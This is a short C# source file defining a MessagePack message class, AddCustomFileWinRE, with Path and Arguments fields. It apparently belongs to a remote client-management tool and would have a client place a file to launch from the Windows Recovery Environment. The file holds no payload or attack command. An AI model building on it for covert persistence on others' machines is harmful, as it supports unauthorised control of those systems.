using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.ClientManagement.WinRE
{
    [MessagePackObject]
    public class AddCustomFileWinRE : IMessage
    {
        [Key(1)]
        public string Path { get; set; } = string.Empty;

        [Key(2)]
        public string Arguments { get; set; } = string.Empty;
    }
}
